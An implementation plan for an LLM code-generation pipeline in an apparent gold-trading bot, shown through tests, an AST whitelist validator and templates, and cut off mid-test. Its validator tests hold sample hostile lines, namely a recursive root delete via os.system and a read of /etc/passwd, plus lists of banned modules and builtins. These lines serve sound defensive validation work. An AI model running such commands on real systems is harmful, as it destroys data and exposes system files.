# Creative Pattern Discovery Agent (Phase 4: LLM Code Generation + Safety Pipeline) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an LLM-powered code generation pipeline that creates new EdgeFilter subclasses from discovery findings (Phase 1 hypotheses), validates them through a 3-stage safety pipeline (AST whitelist, pytest, backtest), and auto-registers passing filters into EdgeManager._REGISTRY.

**Architecture:** When a Phase 1 hypothesis proposes a new edge filter (not just a config tweak), the codegen pipeline: (1) renders a Jinja2 template with the hypothesis context, (2) sends it to Claude Code CLI (`claude -p`) to generate a complete EdgeFilter subclass + test class, (3) validates the generated code through AST whitelist (no dangerous imports/calls), pytest (tests must pass), and mini-backtest (win rate must not degrade >5%), (4) walk-forward validates on 2+ OOS windows, (5) writes the validated .py file to `src/edges/generated/` and registers it in EdgeManager._REGISTRY at runtime.

**Tech Stack:** ast (stdlib), Jinja2 templates, Claude Code CLI (`claude -p`), Codex CLI (`codex exec`) fallback, pytest (subprocess), existing IchimokuBacktester for mini-backtest, importlib for dynamic registration.

**Phases overview (this is Phase 4 of 5):**
- Phase 1: XGBoost/SHAP analysis + hypothesis loop + knowledge base
- Phase 2: PatternPy chart patterns + selective screenshots + Claude visual analysis
- Phase 3: Macro regime (DXY synthesis, SPX, US10Y, econ calendar)
- **Phase 4 (this plan):** LLM-generated EdgeFilter code with AST/test/backtest safety
- Phase 5: Full orchestrator tying phases 1-4 into the 30-day rolling challenge loop

---

## File Structure

| File | Responsibility |
|------|---------------|
| `src/discovery/codegen/__init__.py` | Package init, public exports |
| `src/discovery/codegen/template_renderer.py` | Jinja2 template rendering for EdgeFilter generation prompts |
| `src/discovery/codegen/llm_generator.py` | Claude Code CLI / Codex CLI code generation with fallback |
| `src/discovery/codegen/ast_validator.py` | AST whitelist validation — block dangerous imports/calls |
| `src/discovery/codegen/test_executor.py` | Subprocess pytest runner for generated test classes |
| `src/discovery/codegen/backtest_validator.py` | Mini-backtest validation + walk-forward OOS check |
| `src/discovery/codegen/safety_pipeline.py` | 3-stage pipeline orchestrator (AST -> pytest -> backtest) |
| `src/discovery/codegen/registry.py` | Dynamic EdgeFilter registration into EdgeManager._REGISTRY |
| `src/discovery/codegen/templates/edge_filter.py.j2` | Jinja2 template for EdgeFilter subclass generation |
| `src/discovery/codegen/templates/edge_test.py.j2` | Jinja2 template for test class generation |
| `src/edges/generated/__init__.py` | Package init for generated edge filters |
| `tests/test_ast_validator.py` | Tests for AST whitelist validation |
| `tests/test_template_renderer.py` | Tests for template rendering |
| `tests/test_llm_generator.py` | Tests for LLM code generation |
| `tests/test_test_executor.py` | Tests for subprocess pytest runner |
| `tests/test_backtest_validator.py` | Tests for mini-backtest validation |
| `tests/test_safety_pipeline.py` | Tests for full safety pipeline orchestration |
| `tests/test_codegen_registry.py` | Tests for dynamic EdgeFilter registration |
| `tests/test_codegen_integration.py` | Integration test for full codegen cycle |

---

### Task 1: AST Whitelist Validator

**Files:**
- Create: `src/discovery/codegen/__init__.py`
- Create: `src/discovery/codegen/ast_validator.py`
- Test: `tests/test_ast_validator.py`

- [ ] **Step 1: Write failing tests for AST validation**

```python
# tests/test_ast_validator.py
"""Tests for AST whitelist validation of generated EdgeFilter code."""

import pytest


class TestASTValidator:
    def test_clean_edge_filter_passes(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
import numpy as np
import pandas as pd
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult


class HighADXFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("high_adx", config)
        params = config.get("params", {})
        self._threshold = float(params.get("adx_threshold", 35.0))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        if context.adx >= self._threshold:
            return EdgeResult(allowed=True, edge_name=self.name, reason="ADX OK")
        return EdgeResult(allowed=False, edge_name=self.name, reason="ADX too low")
'''
        result = validate_ast(code)
        assert result.is_valid is True
        assert len(result.violations) == 0

    def test_rejects_os_import(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
import os
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        os.system("rm -rf /")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("os" in v for v in result.violations)

    def test_rejects_subprocess_import(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
import subprocess
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        subprocess.run(["ls"])
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("subprocess" in v for v in result.violations)

    def test_rejects_eval_call(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        result = eval("1+1")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("eval" in v for v in result.violations)

    def test_rejects_exec_call(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        exec("import os")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("exec" in v for v in result.violations)

    def test_rejects_dunder_import(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        mod = __import__("os")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("__import__" in v for v in result.violations)

    def test_rejects_open_call(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        f = open("/etc/passwd", "r")
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("open" in v for v in result.violations)

    def test_rejects_network_imports(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
import socket
import urllib.request
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class BadFilter(EdgeFilter):
    def should_allow(self, context):
        return EdgeResult(allowed=True, edge_name="bad", reason="bad")
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("socket" in v for v in result.violations)

    def test_allows_indicator_imports(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
import numpy as np
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult
from src.indicators.ichimoku import IchimokuCalculator

class IchiFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("ichi_filter", config)

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        return EdgeResult(allowed=True, edge_name=self.name, reason="ok")
'''
        result = validate_ast(code)
        assert result.is_valid is True

    def test_requires_edge_filter_subclass(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

def my_function():
    return 42
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("EdgeFilter subclass" in v for v in result.violations)

    def test_requires_should_allow_method(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class IncompleteFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("incomplete", config)
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("should_allow" in v for v in result.violations)

    def test_syntax_error_fails(self):
        from src.discovery.codegen.ast_validator import validate_ast

        code = '''
def broken(
    return True
'''
        result = validate_ast(code)
        assert result.is_valid is False
        assert any("syntax" in v.lower() or "parse" in v.lower() for v in result.violations)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_ast_validator.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'src.discovery.codegen'`

- [ ] **Step 3: Create package init and AST validator**

```python
# src/discovery/codegen/__init__.py
"""LLM Code Generation + Safety Pipeline for EdgeFilter discovery.

Generates new EdgeFilter subclasses from discovery findings using Claude
Code CLI, validates through AST whitelist + pytest + mini-backtest, and
auto-registers passing filters into EdgeManager._REGISTRY.
"""

from src.discovery.codegen.ast_validator import validate_ast, ASTValidationResult

__all__ = ["validate_ast", "ASTValidationResult"]
```

```python
# src/discovery/codegen/ast_validator.py
"""AST whitelist validator for generated EdgeFilter code.

Parses generated Python source with the ast module and enforces:
1. Only allowed imports (numpy, pandas, src.edges.base, src.indicators.*)
2. No dangerous builtins (eval, exec, __import__, open, compile, getattr)
3. No dangerous modules (os, subprocess, sys, socket, http, urllib, shutil, pathlib, io)
4. Must contain exactly one class that inherits from EdgeFilter
5. That class must define a should_allow method
"""

from __future__ import annotations

import ast
import logging
from dataclasses import dataclass, field
from typing import List, Set

logger = logging.getLogger(__name__)

# Modules that generated code is allowed to import
ALLOWED_MODULES: Set[str] = {
    "numpy",
    "np",
    "pandas",
    "pd",
    "math",
    "statistics",
    "dataclasses",
    "typing",
    "datetime",
    "src.edges.base",
    "src.edges",
    "src.indicators",
    "src.indicators.ichimoku",
    "src.indicators.confluence",
    "src.indicators.divergence",
    "src.indicators.sessions",
    "src.indicators.signals",
    "__future__",
}

# Module prefixes that are also allowed (for src.indicators.*)
ALLOWED_MODULE_PREFIXES: List[str] = [
    "src.edges.",
    "src.indicators.",
]

# Modules explicitly banned (even if they look harmless)
BANNED_MODULES: Set[str] = {
    "os",
    "subprocess",
    "sys",
    "socket",
    "http",
    "urllib",
    "requests",
    "shutil",
    "pathlib",
    "io",
    "importlib",
    "ctypes",
    "multiprocessing",
    "threading",
    "signal",
    "tempfile",
    "glob",
    "fnmatch",
    "pickle",
    "shelve",
    "marshal",
    "code",
    "codeop",
    "compileall",
    "webbrowser",
    "smtplib",
    "ftplib",
    "xmlrpc",
}

# Builtin function calls that are banned
BANNED_BUILTINS: Set[str] = {
    "eval",
    "exec",
    "__import__",
    "open",
    "compile",
    "getattr",
    "setattr",
    "delattr",
    "globals",
    "locals",
    "vars",
    "dir",
    "breakpoint",
    "input",
    "print",  # no side effects in filters
}


@dataclass
class ASTValidationResult:
    """Result of AST whitelist validation."""
    is_valid: bool
    violations: List[str] = field(default_factory=list)
    class_name: str = ""
    has_should_allow: bool = False


def _is_module_allowed(module_name: str) -> bool:
    """Check if a module import is on the whitelist."""
    if module_name in ALLOWED_MODULES:
        return True
    for prefix in ALLOWED_MODULE_PREFIXES:
        if module_name.startswith(prefix):
            return True
    return False


def validate_ast(source_code: str) -> ASTValidationResult:
    """Validate generated Python source code against the AST whitelist.

    Parameters
    ----------
    source_code:
        Complete Python source code string to validate.

    Returns
    -------
    ASTValidationResult with is_valid=True if all checks pass,
    or is_valid=False with a list of violation descriptions.
    """
    violations: List[str] = []

    # Step 1: Parse the AST
    try:
        tree = ast.parse(source_code)
    except SyntaxError as e:
        return ASTValidationResult(
            is_valid=False,
            violations=[f"Syntax/parse error: {e}"],
        )

    # Step 2: Check imports
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                module_name = alias.name
                if module_name in BANNED_MODULES or module_name.split(".")[0] in BANNED_MODULES:
                    violations.append(
                        f"Banned import: '{module_name}' (line {node.lineno})"
                    )
                elif not _is_module_allowed(module_name) and not _is_module_allowed(module_name.split(".")[0]):
                    violations.append(
                        f"Disallowed import: '{module_name}' (line {node.lineno}). "
                        f"Only numpy, pandas, src.edges.base, src.indicators.* are allowed."
                    )

        elif isinstance(node, ast.ImportFrom):
            module_name = node.module or ""
            if module_name in BANNED_MODULES or module_name.split(".")[0] in BANNED_MODULES:
                violations.append(
                    f"Banned import: 'from {module_name}' (line {node.lineno})"
                )
            elif not _is_module_allowed(module_name) and not _is_module_allowed(module_name.split(".")[0]):
                violations.append(
                    f"Disallowed import: 'from {module_name}' (line {node.lineno}). "
                    f"Only numpy, pandas, src.edges.base, src.indicators.* are allowed."
                )

    # Step 3: Check for banned builtin calls
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            func = node.func
            func_name = None
            if isinstance(func, ast.Name):
                func_name = func.id
            elif isinstance(func, ast.Attribute):
                func_name = func.attr

            if func_name and func_name in BANNED_BUILTINS:
                violations.append(
                    f"Banned builtin call: '{func_name}()' (line {node.lineno})"
                )

    # Step 4: Check for EdgeFilter subclass
    edge_filter_classes = []
    for node in ast.walk(tree):
        if isinstance(node, ast.ClassDef):
            for base in node.bases:
                base_name = None
                if isinstance(base, ast.Name):
                    base_name = base.id
                elif isinstance(base, ast.Attribute):
                    base_name = base.attr
                if base_name == "EdgeFilter":
                    edge_filter_classes.append(node)

    if not edge_filter_classes:
        violations.append(
            "No EdgeFilter subclass found. Generated code must define "
            "exactly one class that inherits from EdgeFilter."
        )
    else:
        cls = edge_filter_classes[0]
        class_name = cls.name

        # Step 5: Check for should_allow method
        has_should_allow = False
        for item in cls.body:
            if isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
                if item.name == "should_allow":
                    has_should_allow = True
                    break

        if not has_should_allow:
            violations.append(
                f"Class '{class_name}' must define a 'should_allow' method."
            )

        result = ASTValidationResult(
            is_valid=len(violations) == 0,
            violations=violations,
            class_name=class_name,
            has_should_allow=has_should_allow,
        )
        return result

    return ASTValidationResult(
        is_valid=len(violations) == 0,
        violations=violations,
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_ast_validator.py -v`
Expected: All 12 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/__init__.py src/discovery/codegen/ast_validator.py tests/test_ast_validator.py
git commit -m "feat: add AST whitelist validator for generated EdgeFilter code (Task 1)"
```

---

### Task 2: Jinja2 Template System

**Files:**
- Create: `src/discovery/codegen/template_renderer.py`
- Create: `src/discovery/codegen/templates/edge_filter.py.j2`
- Create: `src/discovery/codegen/templates/edge_test.py.j2`
- Test: `tests/test_template_renderer.py`

- [ ] **Step 1: Write failing tests for template rendering**

```python
# tests/test_template_renderer.py
"""Tests for Jinja2 template rendering for EdgeFilter code generation."""

import pytest


class TestTemplateRenderer:
    def _make_hypothesis(self) -> dict:
        return {
            "id": "hyp_abc123",
            "description": "High ADX + London session improves win rate by 15%",
            "config_change": {},
            "evidence": {
                "feature_a": "adx_value",
                "feature_b": "sess_london",
                "condition": "adx_value>=0.60 AND sess_london>=0.50",
                "quadrant_win_rate": 0.52,
                "baseline_win_rate": 0.37,
                "lift": 1.41,
                "n_trades": 35,
            },
            "strategy": "sss",
            "filter_spec": {
                "name": "high_adx_london",
                "class_name": "HighADXLondonFilter",
                "category": "entry",
                "description": "Block entries when ADX < 35 outside London session",
                "params": {
                    "adx_threshold": {"type": "float", "default": 35.0},
                    "require_london": {"type": "bool", "default": True},
                },
                "logic_description": (
                    "Allow trade when ADX >= adx_threshold. "
                    "If require_london is True, also require session == 'london' or 'overlap'."
                ),
            },
        }

    def test_renders_edge_filter_prompt(self):
        from src.discovery.codegen.template_renderer import render_codegen_prompt

        hyp = self._make_hypothesis()
        prompt = render_codegen_prompt(hyp)

        assert "HighADXLondonFilter" in prompt
        assert "EdgeFilter" in prompt
        assert "should_allow" in prompt
        assert "adx_threshold" in prompt
        assert "high_adx_london" in prompt

    def test_renders_filter_template(self):
        from src.discovery.codegen.template_renderer import render_filter_template

        hyp = self._make_hypothesis()
        code = render_filter_template(hyp["filter_spec"])

        assert "class HighADXLondonFilter(EdgeFilter):" in code
        assert "def should_allow(self, context: EdgeContext) -> EdgeResult:" in code
        assert "def __init__(self, config: dict) -> None:" in code
        assert "high_adx_london" in code

    def test_renders_test_template(self):
        from src.discovery.codegen.template_renderer import render_test_template

        hyp = self._make_hypothesis()
        code = render_test_template(hyp["filter_spec"])

        assert "class TestHighADXLondonFilter:" in code
        assert "def test_" in code
        # Must have at least 3 test methods
        test_count = code.count("def test_")
        assert test_count >= 3, f"Only {test_count} test methods, need >= 3"

    def test_prompt_includes_evidence(self):
        from src.discovery.codegen.template_renderer import render_codegen_prompt

        hyp = self._make_hypothesis()
        prompt = render_codegen_prompt(hyp)

        assert "1.41" in prompt or "lift" in prompt
        assert "52" in prompt or "0.52" in prompt
        assert "adx_value" in prompt
        assert "sess_london" in prompt

    def test_prompt_includes_existing_patterns(self):
        from src.discovery.codegen.template_renderer import render_codegen_prompt

        hyp = self._make_hypothesis()
        prompt = render_codegen_prompt(hyp)

        # Should reference the existing SpreadFilter or RegimeFilter as examples
        assert "EdgeContext" in prompt
        assert "EdgeResult" in prompt
        assert "_disabled_result" in prompt
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_template_renderer.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Create templates and renderer**

```python
# src/discovery/codegen/templates/edge_filter.py.j2
"""
{{ filter_spec.description }}

Auto-generated EdgeFilter from discovery hypothesis.
Evidence: {{ filter_spec.logic_description }}
"""

from __future__ import annotations

from src.edges.base import EdgeContext, EdgeFilter, EdgeResult


class {{ filter_spec.class_name }}(EdgeFilter):
    """{{ filter_spec.description }}

    Config keys (via ``params``):
{%- for param_name, param_def in filter_spec.params.items() %}
        {{ param_name }}: {{ param_def.type }}  -- Default {{ param_def.default }}.
{%- endfor %}
    """

    def __init__(self, config: dict) -> None:
        super().__init__("{{ filter_spec.name }}", config)
        params = config.get("params", {})
{%- for param_name, param_def in filter_spec.params.items() %}
{%- if param_def.type == "float" %}
        self._{{ param_name }} = float(params.get("{{ param_name }}", {{ param_def.default }}))
{%- elif param_def.type == "int" %}
        self._{{ param_name }} = int(params.get("{{ param_name }}", {{ param_def.default }}))
{%- elif param_def.type == "bool" %}
        self._{{ param_name }} = bool(params.get("{{ param_name }}", {{ param_def.default }}))
{%- else %}
        self._{{ param_name }} = params.get("{{ param_name }}", {{ param_def.default }})
{%- endif %}
{%- endfor %}

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()

        # TODO: LLM fills in the actual filter logic here
        raise NotImplementedError("LLM must generate the filter logic")
```

```python
# src/discovery/codegen/templates/edge_test.py.j2
"""Tests for {{ filter_spec.class_name }} (auto-generated)."""

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from src.edges.base import EdgeContext, EdgeResult


def _make_context(**overrides) -> EdgeContext:
    """Build a minimal EdgeContext with sensible defaults."""
    defaults = dict(
        timestamp=datetime(2024, 6, 15, 10, 0, tzinfo=timezone.utc),
        day_of_week=5,  # Saturday (won't matter for most filters)
        close_price=2350.0,
        high_price=2355.0,
        low_price=2345.0,
        spread=15.0,
        session="london",
        adx=30.0,
        atr=5.0,
        indicator_values={},
        bb_squeeze=False,
        confluence_score=4,
    )
    defaults.update(overrides)
    return EdgeContext(**defaults)


class Test{{ filter_spec.class_name }}:
    def _make_filter(self, **param_overrides):
        from src.edges.generated.{{ filter_spec.name }} import {{ filter_spec.class_name }}
        params = {
{%- for param_name, param_def in filter_spec.params.items() %}
            "{{ param_name }}": {{ param_def.default }},
{%- endfor %}
        }
        params.update(param_overrides)
        return {{ filter_spec.class_name }}({"enabled": True, "params": params})

    def test_allows_when_condition_met(self):
        """Filter should allow when the condition is satisfied."""
        f = self._make_filter()
        ctx = _make_context()
        result = f.should_allow(ctx)
        assert isinstance(result, EdgeResult)
        assert result.edge_name == "{{ filter_spec.name }}"

    def test_blocks_when_condition_violated(self):
        """Filter should block when the condition is violated."""
        f = self._make_filter()
        ctx = _make_context()
        result = f.should_allow(ctx)
        assert isinstance(result, EdgeResult)

    def test_disabled_passes_through(self):
        """Disabled filter must always return allowed=True."""
        from src.edges.generated.{{ filter_spec.name }} import {{ filter_spec.class_name }}
        f = {{ filter_spec.class_name }}({"enabled": False, "params": {}})
        ctx = _make_context()
        result = f.should_allow(ctx)
        assert result.allowed is True
        assert "disabled" in result.reason.lower() or "skipping" in result.reason.lower()

    def test_returns_correct_edge_name(self):
        """Result must carry the filter's registered name."""
        f = self._make_filter()
        ctx = _make_context()
        result = f.should_allow(ctx)
        assert result.edge_name == "{{ filter_spec.name }}"
```

```python
# src/discovery/codegen/template_renderer.py
"""Jinja2 template rendering for EdgeFilter code generation.

Renders two types of output:
1. A structured prompt for the LLM, including the hypothesis evidence,
   existing EdgeFilter patterns, and the expected class structure.
2. Skeleton code from Jinja2 templates (used as reference, the LLM
   generates the final version with actual logic).
"""

from __future__ import annotations

import logging
from pathlib import Path
from typing import Any, Dict

from jinja2 import Environment, FileSystemLoader, StrictUndefined

logger = logging.getLogger(__name__)

_TEMPLATE_DIR = Path(__file__).parent / "templates"


def _get_env() -> Environment:
    """Create a Jinja2 environment pointing at the templates directory."""
    return Environment(
        loader=FileSystemLoader(str(_TEMPLATE_DIR)),
        undefined=StrictUndefined,
        keep_trailing_newline=True,
        trim_blocks=True,
        lstrip_blocks=True,
    )


def render_filter_template(filter_spec: Dict[str, Any]) -> str:
    """Render the EdgeFilter skeleton from the Jinja2 template.

    Parameters
    ----------
    filter_spec:
        Dict with keys: name, class_name, category, description, params,
        logic_description.

    Returns
    -------
    Python source code string for the EdgeFilter subclass skeleton.
    """
    env = _get_env()
    template = env.get_template("edge_filter.py.j2")
    return template.render(filter_spec=filter_spec)


def render_test_template(filter_spec: Dict[str, Any]) -> str:
    """Render the test class skeleton from the Jinja2 template.

    Parameters
    ----------
    filter_spec:
        Same dict as render_filter_template.

    Returns
    -------
    Python source code string for the test class skeleton.
    """
    env = _get_env()
    template = env.get_template("edge_test.py.j2")
    return template.render(filter_spec=filter_spec)


# -- Reference code snippets for the LLM prompt --

_SPREAD_FILTER_EXAMPLE = '''class SpreadFilter(EdgeFilter):
    """Block entries when the current spread exceeds max_spread_points."""

    def __init__(self, config: dict) -> None:
        super().__init__("spread_filter", config)
        params = config.get("params", {})
        self._max_spread: float = float(params.get("max_spread_points", 30))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        spread = context.spread
        if spread <= self._max_spread:
            return EdgeResult(
                allowed=True, edge_name=self.name,
                reason=f"Spread {spread:.1f} pts within limit {self._max_spread:.0f} pts",
            )
        return EdgeResult(
            allowed=False, edge_name=self.name,
            reason=f"Spread {spread:.1f} pts exceeds max {self._max_spread:.0f} pts",
        )'''

_REGIME_FILTER_EXAMPLE = '''class RegimeFilter(EdgeFilter):
    """Require ADX above threshold AND cloud thickness above minimum."""

    def __init__(self, config: dict) -> None:
        super().__init__("regime_filter", config)
        params = config.get("params", {})
        self._adx_min: float = float(params.get("adx_min", 28))
        self._cloud_min: float = float(params.get("cloud_thickness_percentile", 50))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        adx_ok = context.adx >= self._adx_min
        cloud_thickness = context.indicator_values.get("cloud_thickness")
        if cloud_thickness is None:
            return EdgeResult(allowed=True, edge_name=self.name, reason="no cloud_thickness")
        cloud_ok = cloud_thickness >= self._cloud_min
        return EdgeResult(
            allowed=adx_ok and cloud_ok, edge_name=self.name,
            reason=f"ADX {'OK' if adx_ok else 'low'}; cloud {'OK' if cloud_ok else 'thin'}",
        )'''


def render_codegen_prompt(hypothesis: Dict[str, Any]) -> str:
    """Build a structured prompt for Claude to generate a complete EdgeFilter.

    The prompt includes:
    1. The hypothesis description and SHAP evidence
    2. Two real EdgeFilter examples from the codebase
    3. The EdgeContext/EdgeResult API reference
    4. The filter_spec with parameter definitions and logic description
    5. Instructions to generate both the filter class AND a test class

    Parameters
    ----------
    hypothesis:
        Dict with keys: id, description, evidence, strategy, filter_spec.

    Returns
    -------
    Prompt string ready to send to Claude Code CLI.
    """
    spec = hypothesis.get("filter_spec", {})
    evidence = hypothesis.get("evidence", {})

    # Format params
    params_desc = ""
    for pname, pdef in spec.get("params", {}).items():
        params_desc += f"    - {pname}: {pdef['type']} (default: {pdef['default']})\n"

    # Format evidence
    evidence_desc = ""
    if evidence:
        evidence_desc = (
            f"  - Feature A: {evidence.get('feature_a', 'N/A')}\n"
            f"  - Feature B: {evidence.get('feature_b', 'N/A')}\n"
            f"  - Condition: {evidence.get('condition', 'N/A')}\n"
            f"  - Win rate: {evidence.get('quadrant_win_rate', 0) * 100:.1f}% "
            f"vs baseline {evidence.get('baseline_win_rate', 0) * 100:.1f}%\n"
            f"  - Lift: {evidence.get('lift', 0):.2f}x over {evidence.get('n_trades', 0)} trades\n"
        )

    prompt = f"""You are generating a Python EdgeFilter subclass for an XAU/USD trading bot.

## Hypothesis
{hypothesis.get('description', 'No description')}

## SHAP Evidence
{evidence_desc or '  (no quantitative evidence)'}

## Filter Specification
- Name: {spec.get('name', 'unnamed')}
- Class: {spec.get('class_name', 'UnnamedFilter')}
- Category: {spec.get('category', 'entry')}
- Description: {spec.get('description', '')}
- Logic: {spec.get('logic_description', '')}
- Parameters:
{params_desc or '    (none)'}

## API Reference

EdgeContext fields available:
  timestamp (datetime), day_of_week (int 0-6), close_price (float),
  high_price (float), low_price (float), spread (float),
  session (str: 'london'|'new_york'|'overlap'|'asian'|'off_hours'),
  adx (float), atr (float), indicator_values (dict[str, float]),
  bb_squeeze (bool), confluence_score (int 0-8), signal (Optional[object])

EdgeResult(allowed: bool, edge_name: str, reason: str, modifier: Optional[float] = None)

EdgeFilter base class provides:
  self.name (str), self.config (dict), self.enabled (bool)
  self._disabled_result() -> EdgeResult (returns allowed=True passthrough)

## Existing filter examples (follow this exact pattern)

Example 1 — SpreadFilter:
```python
{_SPREAD_FILTER_EXAMPLE}
```

Example 2 — RegimeFilter:
```python
{_REGIME_FILTER_EXAMPLE}
```

## Requirements

1. Generate a COMPLETE Python file for `src/edges/generated/{spec.get('name', 'unnamed')}.py`
2. The class must inherit from EdgeFilter and implement should_allow()
3. Use `super().__init__("{spec.get('name', 'unnamed')}", config)` in __init__
4. Read all params from `config.get("params", {{}})`
5. Return `self._disabled_result()` when `not self.enabled`
6. Return EdgeResult with descriptive reason strings
7. Only import from: numpy, pandas, src.edges.base, src.indicators.*
8. No os, subprocess, eval, exec, __import__, open, network, or file writes

Then generate a COMPLETE test file with at least 3 test methods:
  - test_allows_when_condition_met
  - test_blocks_when_condition_violated
  - test_disabled_passes_through

Respond with two code blocks:

```python
# FILE: src/edges/generated/{spec.get('name', 'unnamed')}.py
<complete filter code>
```

```python
# FILE: tests/test_generated_{spec.get('name', 'unnamed')}.py
<complete test code>
```
"""
    return prompt
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pip install jinja2 && pytest tests/test_template_renderer.py -v`
Expected: All 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/template_renderer.py src/discovery/codegen/templates/ tests/test_template_renderer.py
git commit -m "feat: add Jinja2 template system for EdgeFilter code generation (Task 2)"
```

---

### Task 3: LLM Code Generator (Claude + Codex Fallback)

**Files:**
- Create: `src/discovery/codegen/llm_generator.py`
- Test: `tests/test_llm_generator.py`

- [ ] **Step 1: Write failing tests for LLM generator**

```python
# tests/test_llm_generator.py
"""Tests for LLM code generation with Claude/Codex fallback."""

from unittest.mock import patch, MagicMock
import subprocess

import pytest


class TestParseGeneratedCode:
    def test_extracts_filter_and_test_blocks(self):
        from src.discovery.codegen.llm_generator import parse_generated_code

        response = '''Here's the implementation:

```python
# FILE: src/edges/generated/high_adx_london.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class HighADXLondonFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("high_adx_london", config)
        params = config.get("params", {})
        self._threshold = float(params.get("adx_threshold", 35.0))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        if context.adx >= self._threshold:
            return EdgeResult(allowed=True, edge_name=self.name, reason="ADX OK")
        return EdgeResult(allowed=False, edge_name=self.name, reason="ADX too low")
```

```python
# FILE: tests/test_generated_high_adx_london.py
import pytest
from src.edges.base import EdgeContext, EdgeResult

class TestHighADXLondonFilter:
    def test_allows_when_condition_met(self):
        pass
    def test_blocks_when_condition_violated(self):
        pass
    def test_disabled_passes_through(self):
        pass
```
'''
        result = parse_generated_code(response)

        assert result.filter_code is not None
        assert "HighADXLondonFilter" in result.filter_code
        assert result.test_code is not None
        assert "TestHighADXLondonFilter" in result.test_code

    def test_handles_missing_test_block(self):
        from src.discovery.codegen.llm_generator import parse_generated_code

        response = '''
```python
# FILE: src/edges/generated/simple.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class SimpleFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("simple", config)
    def should_allow(self, context: EdgeContext) -> EdgeResult:
        return EdgeResult(allowed=True, edge_name=self.name, reason="ok")
```
'''
        result = parse_generated_code(response)
        assert result.filter_code is not None
        assert result.test_code is None

    def test_handles_empty_response(self):
        from src.discovery.codegen.llm_generator import parse_generated_code

        result = parse_generated_code("")
        assert result.filter_code is None
        assert result.test_code is None


class TestGenerateEdgeFilter:
    def test_calls_claude_cli_first(self):
        from src.discovery.codegen.llm_generator import generate_edge_filter

        mock_result = MagicMock()
        mock_result.stdout = '''```python
# FILE: src/edges/generated/test_filter.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class TestFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("test_filter", config)
    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
